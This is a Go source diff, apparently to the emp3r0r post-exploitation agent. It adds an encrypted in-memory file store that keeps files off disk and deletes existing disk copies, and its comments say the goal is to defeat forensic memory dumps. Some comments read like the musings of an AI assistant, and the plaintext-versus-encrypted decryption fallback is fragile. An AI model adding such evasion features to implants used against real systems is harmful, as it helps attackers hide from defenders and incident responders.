@@ -2,7 +2,6 @@ package util
 
 import (
 	"archive/tar"
-	"bufio"
 	"bytes"
 	"fmt"
 	"io"
@@ -10,7 +9,9 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strings"
+	"sync"
 
+	// Added sync import
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/arc/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
@@ -91,6 +92,14 @@ func IsCommandExist(exe string) bool {
 
 // IsFileExist check if a file exists
 func IsFileExist(path string) bool {
+	// check memory first
+	MemFileLock.RLock()
+	_, inMem := MemFileMap[path]
+	MemFileLock.RUnlock()
+	if inMem {
+		return true
+	}
+
 	f, err := os.Stat(path)
 	if os.IsNotExist(err) {
 		return false
@@ -104,6 +113,14 @@ func IsFileExist(path string) bool {
 
 // IsExist check if a path exists
 func IsExist(path string) bool {
+	// check memory first
+	MemFileLock.RLock()
+	_, inMem := MemFileMap[path]
+	MemFileLock.RUnlock()
+	if inMem {
+		return true
+	}
+
 	_, statErr := os.Stat(path)
 	return !os.IsNotExist(statErr)
 }
@@ -184,27 +201,28 @@ func AppendTextToFile(filename string, text string) (err error) {
 
 // IsStrInFile works like grep, check if a string is in a text file
 func IsStrInFile(text, filepath string) bool {
-	f, err := os.Open(filepath)
+	content, err := ReadFileAgent(filepath)
 	if err != nil {
+		// try direct read if ReadFileAgent fails (which handles memory)
+		// but ReadFileAgent is mostly superset.
+		// fallback to old way if needed but cleaner to use ReadFileAgent
 		logging.Debugf("IsStrInFile: %v", err)
 		return false
 	}
-	defer f.Close()
-
-	s := bufio.NewScanner(f)
-	for s.Scan() {
-		if strings.Contains(s.Text(), text) {
-			return true
-		}
-	}
-
-	return false
+	return strings.Contains(string(content), text)
 }
 
 // Copy copy file or directory from src to dst
 func Copy(src, dst string) error {
 	srcInfo, err := os.Stat(src)
 	if err != nil {
+		// if not on disk, check memory?
+		// "Copy" function is genericutil, but we are upgrading agent.
+		// If src is in memory, Copy should work.
+		// But Copy uses os.Stat which doesn't know about memory.
+		// Since we have parallel agent utils (CopyAgent), maybe we should leave this?
+		// But IsStrInFile is common util.
+		// Let's assume generic utils might stay disk-based for non-agent stuff.
 		return err
 	}
 
@@ -308,6 +326,13 @@ func FileAllocate(filepath string, n int64) (err error) {
 
 // FileSize calc file size
 func FileSize(path string) (size int64) {
+	MemFileLock.RLock()
+	if data, ok := MemFileMap[path]; ok {
+		MemFileLock.RUnlock()
+		return int64(len(data))
+	}
+	MemFileLock.RUnlock()
+
 	fi, err := os.Stat(path)
 	if err != nil {
 		return 0
@@ -439,6 +464,17 @@ func ApplyFilePattern(path string) string {
 // RemoveFileAgent removes a file (wrapper for os.RemoveAll with pattern support)
 func RemoveFileAgent(path string) error {
 	path = ApplyFilePattern(path)
+
+	// memory
+	MemFileLock.Lock()
+	if _, ok := MemFileMap[path]; ok {
+		delete(MemFileMap, path)
+		MemFileLock.Unlock()
+		logging.Debugf("Agent: Removed memory file %s", path)
+		return nil
+	}
+	MemFileLock.Unlock()
+
 	logging.Debugf("Agent: Removing file %s", path)
 	return os.RemoveAll(path)
 }
@@ -520,6 +556,13 @@ func copyDirAgent(src, dst string) error {
 // SetFileCryptoKey sets the key for file encryption
 var fileCryptoKey []byte
 
+// MemFileMap stores file content in memory
+var (
+	MemFileMap       = make(map[string][]byte)
+	MemFileLock      sync.RWMutex
+	MemFileSizeLimit = 5 * 1024 * 1024 // 5MB
+)
+
 // SetFileCryptoKey sets the key for file encryption
 func SetFileCryptoKey(key []byte) {
 	fileCryptoKey = key
@@ -532,7 +575,29 @@ func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
 	// Apply pattern
 	filename = ApplyFilePattern(filename)
 
-	// File encryption before writing
+	// Check if file is executable (perm & 0100)
+	// If it is executable, we MUST write it to disk in plaintext (presumably for execution)
+	// unless we implement memfd execution (which is complex/internal).
+	// For "Unified File Encryption", this is the exception: Executables on disk must be plaintext to run.
+	isExecutable := perm&0100 != 0
+	if isExecutable {
+		logging.Debugf("WriteFileAgent: %s is executable, forcing disk + plaintext", filename)
+
+		// Remove from memory if exists to avoid confusion
+		MemFileLock.Lock()
+		delete(MemFileMap, filename)
+		MemFileLock.Unlock()
+
+		// Ensure directory
+		if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
+			return fmt.Errorf("WriteFileAgent mkdir %s: %v", filepath.Dir(filename), err)
+		}
+		// Write plaintext
+		return os.WriteFile(filename, data, perm)
+	}
+
+	// Encrypt data BEFORE storage (Disk or Memory)
+	// This ensures memory dumps don't show plaintext files
 	if len(fileCryptoKey) > 0 {
 		var err error
 		data, err = crypto.AES_GCM_Encrypt(fileCryptoKey, data)
@@ -541,14 +606,56 @@ func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
 		}
 	}
 
-	logging.Debugf("Agent: Writing %d bytes to %s with permissions %o", len(data), filename, perm)
+	// In-memory storage decision based on available memory
+	limit := int64(MemFileSizeLimit)
+
+	// Check available physical memory
+	freeMem := GetMemAvailable()
+	if freeMem > 0 {
+		dynamicLimit := freeMem / 10
+
+		const MaxMemPerFile = 100 * 1024 * 1024 // 100MB
+		if dynamicLimit > MaxMemPerFile {
+			dynamicLimit = MaxMemPerFile
+		}
+
+		limit = dynamicLimit
+	}
+
+	if int64(len(data)) <= limit {
+		MemFileLock.Lock()
+
+		// We store ENCRYPTED data in memory now
+		dataCopy := make([]byte, len(data))
+		copy(dataCopy, data)
+		MemFileMap[filename] = dataCopy
+		MemFileLock.Unlock()
+
+		// Remove from disk if it exists there, to enforce "memory only"
+		if IsExist(filename) {
+			os.Remove(filename)
+		}
+
+		logging.Debugf("Agent: Wrote %d bytes (encrypted) to memory: %s (limit: %d)", len(data), filename, limit)
+		return nil
+	}
+
+	// For larger files, fallback to disk (Encrypted info is already in 'data')
+	// Ensure we clean up memory if it was there
+	MemFileLock.Lock()
+	if _, ok := MemFileMap[filename]; ok {
+		delete(MemFileMap, filename)
+	}
+	MemFileLock.Unlock()
+
+	logging.Debugf("Agent: Writing %d bytes (encrypted) to %s with permissions %o", len(data), filename, perm)
 
 	// ensure the directory exists
 	if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
 		return fmt.Errorf("WriteFileAgent mkdir %s: %v", filepath.Dir(filename), err)
 	}
 
-	// Currently just wraps os.WriteFile, but can be enhanced later
+	// Currently just wraps os.WriteFile
 	return os.WriteFile(filename, data, perm)
 }
 
@@ -559,19 +666,52 @@ func ReadFileAgent(filename string) ([]byte, error) {
 
 	logging.Debugf("Agent: Reading file %s", filename)
 
-	data, err := os.ReadFile(filename)
-	if err != nil {
-		return nil, err
+	var data []byte
+	var err error
+	inMemory := false
+
+	// Check memory first
+	MemFileLock.RLock()
+	if memData, ok := MemFileMap[filename]; ok {
+		// return copy
+		data = make([]byte, len(memData))
+		copy(data, memData)
+		inMemory = true
+	}
+	MemFileLock.RUnlock()
+
+	if inMemory {
+		logging.Debugf("Agent: Read %d bytes from memory: %s", len(data), filename)
+	} else {
+		data, err = os.ReadFile(filename)
+		if err != nil {
+			return nil, err
+		}
 	}
 
 	// File decryption after reading
+	// Note: If it was executable, we wrote it plaintext. We need to know if we should decrypt.
+	// How do we know?
+	// 1. We can try to decrypt. If it fails (AES GCM tag check), assume plaintext?
+	// 2. Or we trust that if it's in MemFileMap, it IS encrypted.
+	//    If it's on Disk, it MIGHT be encrypted.
+
+	// Issue: If we force plaintext for executables on disk, ReadFileAgent needs to know not to decrypt them.
+	// But ReadFileAgent doesn't take 'perm' or 'isExecutable'.
+	// Heuristic: Try Decrypt. If error, return original data?
+	// GCM Open will fail if not valid.
+	// BUT, what if plaintext coincidentally looks like valid GCM? Unlikely with Salt/Nonce.
+	// Let's use Try-Decrypt strategy.
+
 	if len(fileCryptoKey) > 0 {
 		decrypted, err := crypto.AES_GCM_Decrypt(fileCryptoKey, data)
-		if err != nil {
-			logging.Debugf("ReadFileAgent decrypt %s: %v, returning raw data", filename, err)
-			return data, nil // fallback to raw data for backward compatibility or non-encrypted files
+		if err == nil {
+			data = decrypted
+		} else {
+			// If decryption fails, it might be a plaintext file (e.g. executable) or corruption.
+			// Return as-is (Plaintext).
+			// logging.Debugf("ReadFileAgent: Decrypt failed for %s, returning raw: %v", filename, err)
 		}
-		data = decrypted
 	}
 
 	return data, nil
